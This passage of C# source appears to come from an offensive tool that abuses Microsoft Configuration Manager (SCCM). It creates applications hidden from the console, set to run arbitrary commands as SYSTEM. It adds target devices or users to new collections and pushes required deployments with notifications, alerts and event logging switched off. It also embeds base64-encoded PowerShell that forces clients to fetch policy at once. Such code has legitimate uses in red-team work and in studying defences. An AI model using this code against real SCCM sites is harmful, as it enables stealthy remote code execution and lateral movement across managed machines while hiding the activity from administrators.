AG4AdABfAFIAZQBxAHUAZQBzAHQAQQBzAHMAaQBnAG4AbQBlAG4AdABzACIAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQA7ACAAJABTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAC4AVAByAGkAZwBnAGUAcgBzACAAPQAgAEAAKAAiAFMAaQBtAHAAbABlAEkAbgB0AGUAcgB2AGEAbAA7AE0AaQBuAHUAdABlAHMAPQAxADUAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIABzAGwAZQBlAHAAIAAzADAAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQB9AA==";
                            Exec(wmiConnection, collectionId, collectionName, applicationPath: commandToExecute, runAsUser: false);
                        }
                        // Run policy retrieval and evaluation cycle on the primary device for each user in user collections
                        else if ((uint)collection["CollectionType"] == 1)
                        {
                            foreach (ManagementObject collectionMember in collectionMembers)
                            {
                                UpdateUserPolicyForDevice(wmiConnection, resourceId: collectionMember["ResourceID"].ToString());
                            }
                        }
                    }
                }
            }
            else if (!string.IsNullOrEmpty(deviceName) || !string.IsNullOrEmpty(resourceId) || !string.IsNullOrEmpty(userName))
            {
                UpdateUserPolicyForDevice(wmiConnection, deviceName, resourceId, userName);
            }
        }

        public static void UpdateUserPolicyForDevice(ManagementScope wmiConnection, string deviceName = null, string resourceId = null, string userName = null)
        {
            if (!string.IsNullOrEmpty(resourceId) || !string.IsNullOrEmpty(userName))
            {
                ManagementObject userDevice = GetPrimaryDeviceForUser(wmiConnection, resourceId, userName).OfType<ManagementObject>().First();
                Console.WriteLine($"[+] Forcing {userDevice["ResourceName"]} ({userDevice["ResourceID"]}) to retrieve user policy and execute any new applications available for {userDevice["UniqueUserName"]}");
                deviceName = userDevice["ResourceName"].ToString();
            }
            // $CurrentUser = Get-WmiObject -Query "SELECT UserSID, LogoffTime FROM CCM_UserLogonEvents WHERE LogoffTime=NULL" -Namespace "root\ccm"; $UserID=$CurrentUser.UserSID; $UserID=$UserID.replace("-", "_"); $MessageIDs = "{00000000-0000-0000-0000-000000000026}","{00000000-0000-0000-0000-000000000027}"; ForEach ($MessageID in $MessageIDs) { $ScheduledMessage = ([wmi]"root\ccm\Policy\$UserID\ActualConfig:CCM_Scheduler_ScheduledMessage.ScheduledMessageID=$MessageID"); $ScheduledMessage.Triggers = @("SimpleInterval;Minutes=1;MaxRandomDelayMinutes=0"); $ScheduledMessage.TargetEndpoint = "direct:PolicyAgent_RequestAssignments"; $ScheduledMessage.Put(); $ScheduledMessage.Triggers = @("SimpleInterval;Minutes=15;MaxRandomDelayMinutes=0"); sleep 30; $ScheduledMessage.Put()}
            string commandToExecute = "powershell -EncodedCommand JABDAHUAcgByAGUAbgB0AFUAcwBlAHIAIAA9ACAARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AUQB1AGUAcgB5ACAAIgBTAEUATABFAEMAVAAgAFUAcwBlAHIAUwBJAEQALAAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAIABGAFIATwBNACAAQwBDAE0AXwBVAHMAZQByAEwAbwBnAG8AbgBFAHYAZQBuAHQAcwAgAFcASABFAFIARQAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAPQBOAFUATABMACIAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAIgByAG8AbwB0AFwAYwBjAG0AIgA7ACAAJABVAHMAZQByAEkARAA9ACQAQwB1AHIAcgBlAG4AdABVAHMAZQByAC4AVQBzAGUAcgBTAEkARAA7ACAAJABVAHMAZQByAEkARAA9ACQAVQBzAGUAcgBJAEQALgByAGUAcABsAGEAYwBlACgAIgAtACIALAAgACIAXwAiACkAOwAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwAgAD0AIAAiAHsAMAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAyADYAfQAiACwAIgB7ADAAMAAwADAAMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAAMgA3AH0AIgA7ACAARgBvAHIARQBhAGMAaAAgACgAJABNAGUAcwBzAGEAZwBlAEkARAAgAGkAbgAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwApACAAewAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAgAD0AIAAoAFsAdwBtAGkAXQAiAHIAbwBvAHQAXABjAGMAbQBcAFAAbwBsAGkAYwB5AFwAJABVAHMAZQByAEkARABcAEEAYwB0AHUAYQBsAEMAbwBuAGYAaQBnADoAQwBDAE0AXwBTAGMAaABlAGQAdQBsAGUAcgBfAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAEkARAA9ACQATQBlAHMAcwBhAGcAZQBJAEQAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAHIAaQBnAGcAZQByAHMAIAA9ACAAQAAoACIAUwBpAG0AcABsAGUASQBuAHQAZQByAHYAYQBsADsATQBpAG4AdQB0AGUAcwA9ADEAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAGEAcgBnAGUAdABFAG4AZABwAG8AaQBuAHQAIAA9ACAAIgBkAGkAcgBlAGMAdAA6AFAAbwBsAGkAYwB5AEEAZwBlAG4AdABfAFIAZQBxAHUAZQBzAHQAQQBzAHMAaQBnAG4AbQBlAG4AdABzACIAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQA7ACAAJABTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAC4AVAByAGkAZwBnAGUAcgBzACAAPQAgAEAAKAAiAFMAaQBtAHAAbABlAEkAbgB0AGUAcgB2AGEAbAA7AE0AaQBuAHUAdABlAHMAPQAxADUAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIABzAGwAZQBlAHAAIAAzADAAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQB9AA==";
            Exec(wmiConnection, deviceName: deviceName, applicationPath: commandToExecute, runAsUser: false, collectionType: "device");
        }

        public static ManagementObject NewApplication(ManagementScope wmiConnection, string name, string path, bool runAsUser = false, bool show = false)
        {
            ManagementObject application = null;

            // Check for existing application before creating a new one
            ManagementObjectCollection applications = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Application", whereCondition: $"LocalizedDisplayName='{name}'");
            if (applications.Count > 0)
            {
                Console.WriteLine($"[+] There is already an application with the name {name}");
            }
            else
            {
                Console.WriteLine($"[+] Creating new application: {name}");
                Console.WriteLine($"[+] Application path: {path}");
                ManagementClass idInstance = new ManagementClass(wmiConnection, new ManagementPath("SMS_Identification"), null);
                ManagementBaseObject outParams = idInstance.InvokeMethod("GetSiteID", null, null);
                string siteId = outParams["SiteID"].ToString().Replace("{", "").Replace("}", "");
                string scopeId = $"ScopeId_{siteId}";
                string appId = $"Application_{Guid.NewGuid()}";
                string deploymentId = $"DeploymentType_{Guid.NewGuid()}";
                string fileId = $"File_{Guid.NewGuid()}";
                string xml = $@"<?xml version=""1.0"" encoding=""utf-16""?>
                <AppMgmtDigest xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"">
                    <Application AuthoringScopeId=""{scopeId}"" LogicalName=""{appId}"" Version=""1"">
                        <DisplayInfo DefaultLanguage=""en-US"">
                            <Info Language=""en-US"">
                                <Title>{name}</Title>
                                <Publisher/>
                                <Version/>
                            </Info>
                        </DisplayInfo>
                        <DeploymentTypes>
                            <DeploymentType AuthoringScopeId=""{scopeId}"" LogicalName=""{deploymentId}"" Version=""1""/>
                        </DeploymentTypes>
                        <Title ResourceId=""Res_665624387"">{name}</Title>
                        <Description ResourceId=""Res_215018014""/>
                        <Publisher ResourceId=""Res_433133800""/>
                        <SoftwareVersion ResourceId=""Res_486536226""/>
                        <CustomId ResourceId=""Res_167409166""/>
                    </Application>
                    <DeploymentType AuthoringScopeId=""{scopeId}"" LogicalName=""{deploymentId}"" Version=""1"">
                        <Title ResourceId=""Res_1643586251"">{name}</Title>
                        <Description ResourceId=""Res_1438196005""/>
                        <DeploymentTechnology>GLOBAL/ScriptDeploymentTechnology</DeploymentTechnology>
                        <Technology>Script</Technology>
                        <Hosting>Native</Hosting>
                        <Installer Technology=""Script"">
                            <ExecutionContext>{(runAsUser ? "User" : "System")}</ExecutionContext>
                            <DetectAction>
                                <Provider>Local</Provider>
                                <Args>
                                    <Arg Name=""ExecutionContext"" Type=""String"">{(runAsUser ? "User" : "System")}</Arg>
                                    <Arg Name=""MethodBody"" Type=""String"">
                                        &lt;?xml version=""1.0"" encoding=""utf-16""?&gt;                                                                                       
                                            &lt;EnhancedDetectionMethod xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest""&gt;
                                                &lt;Settings xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest""&gt;
                                                    &lt;File Is64Bit=""true"" LogicalName=""{fileId}"" xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration""&gt;
                                                        &lt;Annotation xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules""&gt;
                                                            &lt;DisplayName Text="""" /&gt;
                                                            &lt;Description Text="""" /&gt;
                                                        &lt;/Annotation&gt;
                                                        &lt;Path&gt;C:\&lt;/Path&gt;
                                                        &lt;Filter&gt;asdf&lt;/Filter&gt;
                                                    &lt;/File&gt;
                                                &lt;/Settings&gt;
                                                &lt;Rule id=""{scopeId}/{deploymentId}"" Severity=""Informational"" NonCompliantWhenSettingIsNotFound=""false"" xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules""&gt;
                                                    &lt;Annotation&gt;
                                                        &lt;DisplayName Text="""" /&gt;
                                                        &lt;Description Text="""" /&gt;
                                                    &lt;/Annotation&gt;
                                                    &lt;Expression&gt;
                                                        &lt;Operator&gt;NotEquals&lt;/Operator&gt;
                                                        &lt;Operands&gt;
                                                            &lt;SettingReference AuthoringScopeId=""{scopeId}"" LogicalName=""{appId}"" Version=""1"" DataType=""Int64"" SettingLogicalName=""{fileId}"" SettingSourceType=""File"" Method=""Count"" Changeable=""false"" /&gt;
                                                            &lt;ConstantValue Value=""0"" DataType=""Int64"" /&gt;
                                                        &lt;/Operands&gt;
                                                    &lt;/Expression&gt;
                                                &lt;/Rule&gt;
                                            &lt;/EnhancedDetectionMethod&gt;
                                    </Arg>
                                </Args>
                            </DetectAction>
                            <InstallAction>
                                <Provider>Script</Provider>
                                <Args>
                                    <Arg Name=""InstallCommandLine"" Type=""String"">{path}</Arg>
                                    <Arg Name=""WorkingDirectory"" Type=""String""/>
                                    <Arg Name=""ExecutionContext"" Type=""String"">{(runAsUser ? "User" : "System")}</Arg>
                                    <Arg Name=""RequiresLogOn"" Type=""String""/>
                                    <Arg Name=""RequiresElevatedRights"" Type=""Boolean"">false</Arg>
                                    <Arg Name=""RequiresUserInteraction"" Type=""Boolean"">false</Arg>
                                    <Arg Name=""RequiresReboot"" Type=""Boolean"">false</Arg>
                                    <Arg Name=""UserInteractionMode"" Type=""String"">Hidden</Arg>
                                    <Arg Name=""PostInstallBehavior"" Type=""String"">BasedOnExitCode</Arg>
                                    <Arg Name=""ExecuteTime"" Type=""Int32"">0</Arg><Arg Name=""MaxExecuteTime"" Type=""Int32"">15</Arg>
                                    <Arg Name=""RunAs32Bit"" Type=""Boolean"">false</Arg>
                                    <Arg Name=""SuccessExitCodes"" Type=""Int32[]"">
                                        <Item>0</Item>
                                        <Item>1707</Item>
                                    </Arg>
                                    <Arg Name=""RebootExitCodes"" Type=""Int32[]"">
                                        <Item>3010</Item>
                                    </Arg>
                                    <Arg Name=""HardRebootExitCodes"" Type=""Int32[]"">
                                        <Item>1641</Item>
                                    </Arg>
                                    <Arg Name=""FastRetryExitCodes"" Type=""Int32[]"">
                                        <Item>1618</Item>
                                    </Arg>
                                </Args>
                            </InstallAction>
                            <CustomData>
                                <DetectionMethod>Enhanced</DetectionMethod>
                                <EnhancedDetectionMethod>
                                    <Settings xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"">
                                        <File xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration"" Is64Bit=""true"" LogicalName=""{fileId}"">
                                            <Annotation xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"">
                                                <DisplayName Text=""""/>
                                                <Description Text=""""/>
                                            </Annotation>
                                            <Path>C:\</Path>
                                            <Filter>asdf</Filter>
                                        </File>
                                    </Settings>
                                    <Rule xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"" id=""{scopeId}/{deploymentId}"" Severity=""Informational"" NonCompliantWhenSettingIsNotFound=""false"">
                                        <Annotation>
                                            <DisplayName Text=""""/><Description Text=""""/>
                                        </Annotation>
                                        <Expression>
                                            <Operator>NotEquals</Operator>
                                            <Operands>
                                                <SettingReference AuthoringScopeId=""{scopeId}"" LogicalName=""{appId}"" Version=""1"" DataType=""Int64"" SettingLogicalName=""{fileId}"" SettingSourceType=""File"" Method=""Count"" Changeable=""false""/>
                                                <ConstantValue Value=""0"" DataType=""Int64""/>
                                            </Operands>
                                        </Expression>
                                    </Rule>
                                </EnhancedDetectionMethod>
                                <InstallCommandLine>{path}</InstallCommandLine>
                                <UninstallSetting>SameAsInstall</UninstallSetting>
                                <InstallFolder/>
                                <UninstallCommandLine/>
                                <UninstallFolder/>
                                <MaxExecuteTime>15</MaxExecuteTime>
                                <ExitCodes>
                                    <ExitCode Code=""0"" Class=""Success""/>
                                    <ExitCode Code=""1707"" Class=""Success""/>
                                    <ExitCode Code=""3010"" Class=""SoftReboot""/>
                                    <ExitCode Code=""1641"" Class=""HardReboot""/>
                                    <ExitCode Code=""1618"" Class=""FastRetry""/>
                                </ExitCodes>
                                <UserInteractionMode>Hidden</UserInteractionMode>
                                <AllowUninstall>true</AllowUninstall>
                            </CustomData>
                        </Installer>
                    </DeploymentType>
                </AppMgmtDigest>
                ";

                //
                // XML with assistance from Config Manager SDK
                //Application appInstance = SccmSerializer.DeserializeFromString(xml, true);
                //string xmla = SccmSerializer.SerializeToString(appInstance, true);

                application = new ManagementClass(wmiConnection, new ManagementPath("SMS_Application"), null).CreateInstance();
                //application["SDMPackageXML"] = xmla;
                application["SDMPackageXML"] = xml;
                if (!show)
                {
                    application["IsHidden"] = true;
                    Console.WriteLine("[+] Updated application to hide it from the Configuration Manager console");
                }
                if (runAsUser)
                {
                    Console.WriteLine("[+] Updated application to run in the context of the logged on user");
                }
                else
                {
                    Console.WriteLine("[+] Updated application to run as SYSTEM");
                }
                try
                {
                    application.Put();
                    ManagementObjectCollection createdApplications = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Application", null, false, null, $"LocalizedDisplayName='{name}'");
                    if (createdApplications.Count > 0)
                    {
                        Console.WriteLine("[+] Successfully created application");
                    }
                    else
                    {
                        Console.WriteLine("[!] The application was not found after creation");
                    }
                }
                catch (ManagementException ex)
                {
                    Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
                    Console.WriteLine("[!] Is your account assigned the correct security role?");
                }
            }
            return application;
        }

        public static ManagementObject NewCollection(ManagementScope wmiConnection, string collectionType, string collectionName)
        {
            ManagementObject returnedCollection = null;
            Console.WriteLine($"[+] Creating new {collectionType} collection: {collectionName}");
            ManagementObject collection = new ManagementClass(wmiConnection, new ManagementPath("SMS_Collection"), null).CreateInstance();
            collection["Name"] = collectionName;
            collection["OwnedByThisSite"] = true;
            if (collectionType == "device")
            {
                collection["CollectionType"] = "2";
                collection["LimitToCollectionId"] = "SMS00001";
            }
            else if (collectionType == "user")
            {
                collection["CollectionType"] = "1";
                collection["LimitToCollectionId"] = "SMS00002";
            }
            try
            {
                collection.Put();
                ManagementObjectCollection createdCollections = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Collection", null, false, null, $"Name='{collectionName}'");
                if (createdCollections.Count == 1)
                {
                    Console.WriteLine("[+] Successfully created collection");
                    foreach (ManagementObject createdCollection in createdCollections)
                    {
                        return createdCollection;
                    }
                }
                else if (createdCollections.Count > 1)
                {
                    Console.WriteLine($"[!] Found {createdCollections.Count} collections named {collectionName}");
                }
                else
                {
                    Console.WriteLine("[!] The collection was not found after creation");
                }
            }
            catch (ManagementException ex)
            {
                Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
                Console.WriteLine("[!] Is your account assigned the correct security role?");
            }
            return returnedCollection;
        }

        public static ManagementObject NewCollectionMember(ManagementScope wmiConnection, string collectionName = null, string collectionType = null, string collectionId = null, string deviceName = null, string userName = null, string resourceId = null, int waitTime = 15)
        {
            ManagementObject collectionMember = null;

            // Use the provided collection type or set to device/user depending on which was provided
            collectionType = !string.IsNullOrEmpty(deviceName) ? "device" : !string.IsNullOrEmpty(userName) ? "user" : collectionType;

            // Check whether the specified collection exists
            ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
            if (collection != null)
            {
                // Check if the resource is already a member of the collection
                ManagementObjectCollection existingMembers = GetCollectionMembers(wmiConnection, collectionName, collectionId, printOutput: false);
                if (existingMembers.Count > 0)
                {
                    foreach (ManagementObject existingMember in existingMembers)
                    {
                        if (!string.IsNullOrEmpty(deviceName) && (string)existingMember.GetPropertyValue("Name") == deviceName)
                        {
                            Console.WriteLine($"[!] A device named {deviceName} is already a member of the collection");
                            return null;
                        }
                        else if (!string.IsNullOrEmpty(userName) && existingMember.GetPropertyValue("Name").ToString().Contains(userName))
                        {
                            Console.WriteLine($"[!] A user named {existingMember.GetPropertyValue("Name")} is already a member of the collection");
                            return null;
                        }
                        else if (!string.IsNullOrEmpty(resourceId) && (uint)existingMember.GetPropertyValue("ResourceID") == Convert.ToUInt32(resourceId))
                        {
                            Console.WriteLine($"[!] A resource with ID {resourceId} is already a member of the collection");
                            return null;
                        }
                    }
                }
                // Check whether the specified resource exists
                ManagementObject matchingResource = GetDeviceOrUser(wmiConnection, deviceName, resourceId, userName, true);
                if (matchingResource != null)
                {
                    if ((uint)collection.Properties[propertyName: "CollectionType"].Value == 1 && collectionType == "device")
                    {
                        Console.WriteLine("[!] Can't add a device to a user collection");
                    }
                    else if ((uint)collection.Properties["CollectionType"].Value == 2 && collectionType == "user")
                    {
                        Console.WriteLine("[!] Can't add a user to a device collection");
                    }
                    else
                    {
                        ManagementObject newCollectionRule = new ManagementClass(wmiConnection, new ManagementPath("SMS_CollectionRuleQuery"), null).CreateInstance();
                        string membershipQuery = $"SELECT * FROM {(collectionType == "device" ? "SMS_R_System" : collectionType == "user" ? "SMS_R_User" : null)} WHERE ResourceID='{matchingResource["ResourceID"]}'";
                        newCollectionRule["QueryExpression"] = membershipQuery;
                        newCollectionRule["RuleName"] = $"{collectionType}_{Guid.NewGuid()}";
                        ManagementBaseObject addMembershipRuleParams = collection.GetMethodParameters("AddMembershipRule");
                        addMembershipRuleParams.SetPropertyValue("collectionRule", newCollectionRule);
                        try
                        {
                            collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
                            Console.WriteLine($"[+] Added {matchingResource["Name"]} {matchingResource["ResourceID"]} to {(!string.IsNullOrEmpty(collectionName) ? collectionName : collectionId)}");
                            Console.WriteLine($"[+] Waiting for new collection member to become available...");
                            bool memberAvailable = false;
                            while (!memberAvailable)
                            {
                                Thread.Sleep(millisecondsTimeout: 5000);
                                ManagementObjectCollection collectionMembers = GetCollectionMembers(wmiConnection, collectionName, collectionId);
                                if (collectionMembers.Count == 1)
                                {
                                    Console.WriteLine($"[+] Successfully added {matchingResource["Name"]} {matchingResource["ResourceID"]} to {(!string.IsNullOrEmpty(collectionName) ? collectionName : collectionId)}");
                                    memberAvailable = true;
                                    collectionMember = collectionMembers.Cast<ManagementObject>().First();
                                }
                                else
                                {
                                    Console.WriteLine("[+] New collection member is not available yet... trying again in 5 seconds");
                                }
                            }
                        }
                        catch (ManagementException ex)
                        {
                            Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
                            Console.WriteLine("[!] Is your account assigned the correct security role?");
                        }
                    }
                }
                else
                {
                    Console.WriteLine($"[!] Found 0 instances of the specified device or user with ResourceID {resourceId}");
                }
            }
            return collectionMember;
        }

        public static ManagementObject NewDeployment(ManagementScope wmiConnection, string applicationName, string collectionName, string collectionId)
        {
            ManagementObject deployment = null;

            // Check if the collection is unique
            ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
            if (collection != null)
            {
                // Check for existing deployment before creating a new one
                ManagementObjectCollection deployments = MgmtUtil.GetClassInstances(wmiConnection, "SMS_ApplicationAssignment", $"SELECT * FROM SMS_ApplicationAssignment WHERE ApplicationName='{applicationName}' AND TargetCollectionID='{collection["CollectionID"]}'");
                if (deployments.Count > 0)
                {
                    foreach (ManagementObject existingDeployment in deployments)
                    {
                        Console.WriteLine($"[!] Application {applicationName} is already assigned to collection {collection["Name"]} ({collection["CollectionID"]}) in deployment {existingDeployment["AssignmentName"]}");
                    }
                }
                else
                {
                    Console.WriteLine($"[+] Creating new deployment of {applicationName} to {collection["Name"]} ({collection["CollectionID"]})");
                    string siteCode = wmiConnection.Path.ToString().Split('_').Last();
                    string now = DateTime.Now.ToString("yyyyMMddHHmmss" + ".000000+***");
                    deployment = new ManagementClass(wmiConnection, new ManagementPath("SMS_ApplicationAssignment"), null).CreateInstance();
                    deployment["ApplicationName"] = applicationName;
                    deployment["AssignmentName"] = $"{applicationName}_{collection["CollectionID"]}_Install";
                    deployment["AssignmentAction"] = 2; // APPLY
                    deployment["AssignmentType"] = 2; // Application
                    deployment["CollectionName"] = collection["Name"];
                    deployment["DesiredConfigType"] = 1; // REQUIRED
                    deployment["DisableMOMAlerts"] = true;
                    deployment["EnforcementDeadline"] = now;
                    deployment["LogComplianceToWinEvent"] = false;
                    deployment["NotifyUser"] = false;
                    deployment["OfferFlags"] = 1; // PREDEPLOY
                    deployment["OfferTypeID"] = 0; // REQUIRED
                    deployment["OverrideServiceWindows"] = true;
                    deployment["Priority"] = 2; // HIGH
                    deployment["RebootOutsideOfServiceWindows"] = false;
                    deployment["SoftDeadlineEnabled"] = true;
                    deployment["SourceSite"] = siteCode;
                    deployment["StartTime"] = now;
                    deployment["SuppressReboot"] = 0;
                    deployment["TargetCollectionID"] = collection["CollectionID"];
                    deployment["UseGMTTimes"] = true;
                    // Do not display user notifications
                    deployment["UserUIExperience"] = false;
                    // Not including this property results in errors displayed in the console
                    deployment["WoLEnabled"] = false; 

                    ManagementObjectCollection applications = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Application", $"SELECT * FROM SMS_Application WHERE LocalizedDisplayName='{applicationName}'");
                    if (applications.Count == 1)
                    {
                        Console.WriteLine($"[+] Found the {applicationName} application");
                        ManagementObject application = applications.OfType<ManagementObject>().First();
                        deployment["AssignedCIs"] = new Int32[] { Convert.ToInt32(application.Properties["CI_ID"].Value) };
                        try
                        {
                            deployment.Put();
                            ManagementObjectCollection createdDeployments = MgmtUtil.GetClassInstances(wmiConnection, "SMS_ApplicationAssignment", null, false, null, $"ApplicationName='{applicationName}' AND TargetCollectionID='{collection["CollectionID"]}'");
                            if (createdDeployments.Count == 1)
                            {
                                Console.WriteLine($"[+] Successfully created deployment of {applicationName} to {collection["Name"]} ({collection["CollectionID"]})");
                                Console.WriteLine($"[+] New deployment name: {createdDeployments.OfType<ManagementObject>().First()["AssignmentName"]}");
                            }
                            else if (createdDeployments.Count == 0)
                            {
                                Console.WriteLine("[!] The deployment was not found after creation");
                            }
                            else
                            {
                                Console.WriteLine($"[!] Found {createdDeployments.Count} deployments of {applicationName} to {collection["Name"]} ({collection["CollectionID"]})");
                            }
                        }
                        catch (ManagementException ex)
                        {
                            Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
                            Console.WriteLine("[!] Is your account assigned the correct security role?");
                        }
                    }
                    else
                    {
                        Console.WriteLine($"[!] Found {applications.Count} applications named {applicationName}");
                    }
                }
            }
            return deployment;
        }
    }
}